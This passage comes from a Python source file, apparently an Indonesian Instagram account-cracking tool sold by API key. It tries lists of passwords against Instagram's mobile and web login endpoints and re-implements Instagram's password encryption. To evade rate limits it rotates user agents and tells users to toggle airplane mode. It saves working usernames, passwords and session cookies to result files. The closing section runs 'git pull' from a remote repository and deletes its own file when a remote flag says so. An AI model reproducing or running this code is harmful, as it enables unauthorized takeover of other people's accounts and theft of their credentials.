                                time.sleep(0.07)
                                Console().print(f"[bold royal_blue1]   ──>[bold red] CSRF-TOKEN ERROR![bold white]", end='\r')
                                time.sleep(5.6)
                                continue
                            r.headers.pop('x-device-id')
                            data = (f'signed_body=538fb2330998e97a58863693212d6e4775d997328c5de7ea5dff621267aa940b.\
                                        %7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{str(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(self.csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(username)}%22%2C%22adid%22%3A%22{str(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{self.x_device_id}%22%2C%22device_id%22%3A%22android-{self._hash.hexdigest()[:16]}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(pws)}%22%2C%22login_attempt_count%22%3A%220%22%7D&ig_sig_key_version=4')
                            r.headers.update({
                                'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                            })
                            response2 = r.post('https://b.i.instagram.com/api/v1/accounts/login/', data = data, allow_redirects = True)
                            #open('Response.txt','a').write(f'{username}|{pws}|{self.useragent}|{response2.text}\n')
                        except (UnicodeDecodeError, UnicodeEncodeError):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] CODEC CANNOT ENCODE CHARACTER![bold white]", end='\r')
                            time.sleep(2.5)
                            continue
                        if 'logged_in_user' in str(response2.text) or 'sessionid' in r.cookies.get_dict().keys():
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                self.cookies = Convert().Cookies(r.cookies.get_dict())
                                try:
                                    self.json_response = json.loads(response2.text)['logged_in_user']
                                    self.ig_set_authorization = response2.headers['ig-set-authorization']
                                    self.uniqueID = self.json_response['pk']
                                    self.phone_number = self.json_response['phone_number']
                                except (Exception):
                                    self.ig_set_authorization, self.uniqueID, self.phone_number = ('-'), ('-'), ('-')
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                            #tree.add(Panel(f"[bold green]{self.cookies}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel(f"[bold green]{self.uniqueID}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.phone_number}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.ig_set_authorization}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Sukses.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies}')
                            open('Results/Ok-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies};\n')
                            break
                        elif 'challenge_required' in str(response2.text):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                self.cookies = Convert().Cookies(r.cookies.get_dict())
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Checkpoint.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
                            open('Results/Cp-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                            break
                        elif 'https://instagram.com/web/unsupported_version/' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] VERSION APLIKASI INSTAGRAM TERBLOKIR![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'ip_block' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'generic_request_error' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif len(response2.text) == 0 or 'Oops, an error occurred.' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] OOPS, AN ERROR OCCURRED![bold white]", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response2.text) or 'Harap tunggu beberapa' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                            time.sleep(7.5)
                        elif '"error_type":"bad_password"' in str(response2.text):
                            Bad += 1
                            continue
                        else:
                            continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold royal_blue1]/[bold white]{str(self.persen)[:4]}%[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping}[bold royal_blue1]/[bold white]{Bad} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except RequestException as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.MAIN_API_2018(total, username, password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

    def MAIN_AJAX_FXCAL_AUTH_INSTAGRAM(self, total, username, password, url_fxcal_auth, encrypt_password):
        global Checkpoint, Sukses, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.persen = Looping * 100 / len(total)
                    with requests.Session() as r:
                        self.useragent = Generate_Useragent().Android_Useragent()
                        r.headers.update({
                            'Host': 'www.instagram.com',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-US,en;q=0.9',
                            'cache-control': 'max-age=0',
                            'sec-fetch-dest': 'document',
                            'connection': 'keep-alive',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'none',
                            'sec-fetch-user': '?1',
                            'upgrade-insecure-requests': '1',
                            'user-agent': self.useragent,
                        })
                        response = r.get(url_fxcal_auth).text
                        try:
                            self.x_csrftoken = re.search('{"csrf_token":"(.*?)"', str(response)).group(1)
                            self.x_ig_app_id = re.search('{"app_id":"(\d+)"', str(response)).group(1)
                            self.etoken = re.search('"etoken":"(.*?)"', str(response)).group(1)
                            self.x_instagram_ajax = re.search('"rollout_hash":"(.*?)"', str(response)).group(1)
                            self.find_enc_pass = re.search('{"key_id":"(\d+)","public_key":"(.*?)","version":"(\d+)"}', str(response))
                            self.key_id, self.public_key, self.version = self.find_enc_pass.group(1), self.find_enc_pass.group(2), self.find_enc_pass.group(3)
                        except (AttributeError):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] ATTRIBUTE ERROR![bold white]", end='\r')
                            time.sleep(5.6)
                            continue
                        r.headers.pop('upgrade-insecure-requests');r.headers.pop('cache-control')
                        if encrypt_password == '1' or encrypt_password == '01':
                            self.enc_password = self.Encrypt_Password(int(self.key_id), self.public_key, pws, int(self.version))
                        else:
                            self.enc_password = (f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pws}')
                        data = {
                            'enc_password': self.enc_password,
                            'etoken': self.etoken,
                            'username': username,
                        }
                        r.headers.update({
                            'x-ig-app-id': self.x_ig_app_id,
                            'accept-encoding': 'gzip, deflate, br',
                            'x-asbd-id': '198387',
                            'sec-fetch-mode': 'cors',
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                            'accept': '*/*',
                            'origin': 'https://www.instagram.com',
                            'x-csrftoken': self.x_csrftoken,
                            'sec-fetch-dest': 'empty',
                            'x-ig-www-claim': 'hmac.AR17d_A6AbGR9aYAeEJNONMwDOO3EkxoC4XYggQpebIuDPcn',
                            'content-type': 'application/x-www-form-urlencoded',
                            'referer': url_fxcal_auth,
                            'sec-fetch-site': 'same-origin',
                            'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                            'x-instagram-ajax': self.x_instagram_ajax,
                        })
                        response2 = r.post('https://www.instagram.com/fxcal/auth/login/ajax/', data = data, allow_redirects = True)
                        #open('Response.txt','a').write(f'{username}|{pws}|{self.enc_password}|{self.useragent}|{response2.text}\n')
                        if '"authenticated":true,' in str(response2.text) and '"token":"' in str(response2.text):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                            if '#PWD_INSTAGRAM_BROWSER:10:' in str(self.enc_password):
                                tree.add(Panel(f"[bold green]{self.enc_password}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Sukses.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|-')
                            open('Results/Ok-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|-\n')
                            break
                        elif '/challenge/action/' in str(response2.text):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                            if '#PWD_INSTAGRAM_BROWSER:10:' in str(self.enc_password):
                                tree.add(Panel(f"[bold red]{self.enc_password}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Checkpoint.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
                            open('Results/Cp-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                            break
                        elif 'Page Not Found' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] COOKIES DISABLED IN YOUR BROWSER![bold white]", end='\r')
                            time.sleep(0.5)
                            continue
                        elif 'generic_request_error' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'ip_block' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif len(response2.text) == 0 or 'Oops, an error occurred.' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] OOPS, AN ERROR OCCURRED![bold white]", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response2.text) or 'Harap tunggu beberapa' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                            time.sleep(7.5)
                        elif '"status":"ok"' in str(response2.text):
                            continue
                        else:
                            continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold royal_blue1]/[bold white]{str(self.persen)[:4]}%[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except RequestException as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.MAIN_AJAX_FXCAL_AUTH_INSTAGRAM(total, username, password, url_fxcal_auth, encrypt_password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

    def Encrypt_Password(self, key_id, pub_key, password, version):
        try:
            self.key = randoms.get_random_bytes(32)
            self.iv = bytes([0] * 12)
            self.time = int(datetime.datetime.now().timestamp())

            self.aes = AES.new(self.key, AES.MODE_GCM, nonce = self.iv, mac_len = 16)
            self.aes.update(str(self.time).encode('utf-8'))
            self.encrypted_password, self.cipher_tag = self.aes.encrypt_and_digest(password.encode('utf-8'))
            self.pub_key_bytes = binascii.unhexlify(pub_key)
            self.seal_box = SealedBox(PublicKey(self.pub_key_bytes))
            self.encrypted_key = self.seal_box.encrypt(self.key)
            self.encrypted = bytes([1,
                key_id,
                *list(struct.pack('<h', len(self.encrypted_key))),
                *list(self.encrypted_key),
                *list(self.cipher_tag),
                *list(self.encrypted_password)
            ])
            self.encrypted = base64.b64encode(self.encrypted).decode('utf-8')
            return (f'#PWD_INSTAGRAM_BROWSER:{version}:{self.time}:{self.encrypted}')
        except (Exception, UnicodeEncodeError, UnicodeDecodeError):
            return (f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{password}')

    def Useragent_String(self, useragent):
        try:
            with requests.Session() as r:
                params = {
                    'key': 'NOTREQUIED',
                    'ua': quote(useragent),
                }
                response = json.loads(r.get('https://whatmyuseragent.com/api/', params = params).text)
                response['device'].pop('isMobile');response['device'].pop('isBot');response['device'].pop('botInfo');response['os'].pop('platform');response['browser'].pop('engine');response['browser'].pop('engine_version')
            return (json.dumps(response))
        except (Exception) as e:
            return (str(e).title())

def Buy_Apikey():
    Terminal().Banner()
    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Apikey Kamu Sudah[italic red] Kadaluarsa[italic white] Agar Bisa Masuk Anda Harus Upgrade Ke[italic green] Premium[italic white], Pilih Harga[italic green] Perminggu[italic white] Atau[italic green] Perbulan[italic white] Dari List Di Bawah Ini Atau Melakukan Pembayaran Di ([italic green]https://wa.me/6283847921480[italic white])", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Beli Apikey) [bold green]<[bold yellow]<[bold red]<"))
    Console(style="bold royal_blue1").print(Columns([
        Panel("[bold green]60k in one month", width=35),
        Panel("[bold green]25k in one week", width=35),
    ]))
    Console().input("[bold white][[bold green]Buy Apikey[bold white]]")
    os.system('xdg-open https://wa.me/6283847921480')
    exit()

if __name__ == '__main__':
    try:
        Terminal().Floder_Terminal_Size()
        Terminal().Anti_WiFi()
        if json.loads(requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/Status.json').text)['Status'] == False:
            if os.path.exists('Data/Syarat-Ketentuan.json') == False:
                Terminal().Banner()
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sebelum Anda Masuk, Kamu Harus Membaca Ini Dan Pahami Setiap Kata ([italic green]https://bit.ly/3T0gt7F[italic red]) Saya Sebagai Author Tidak Bertanggung Jawab Jika Terjadi Sesuatu Hal Yang Tidak Di Inginkan, Jika Kamu Ingin Melanjutkan Tekan Enter, Jika Tidak Tekan CTRL + Z!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Warning) [bold green]<[bold yellow]<[bold red]<"));Console().input("[bold white][[bold green]Setuju[bold white]]")
                with open('Data/Syarat-Ketentuan.json', 'w') as w:
                    w.write(json.dumps({
                        'Setuju': True
                    }))
                w.close()
                time.sleep(3.5)
                os.system('git pull')
                Menu().Utama(List = [])
            else:
                os.system('git pull')
                Menu().Utama(List = [])
        else:
            Terminal().Banner()
            os.remove(f'{sys.argv[0]}')
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sorry, This Tool Is Currently Being Updated. You Can Temporarily Use The Pydroid Version, Please Contact The Developer For Further Information!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Maintenance) [bold green]<[bold yellow]<[bold red]<"))
            exit()
    except (KeyboardInterrupt):
        exit()
    except (Exception) as e:
        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
        exit()
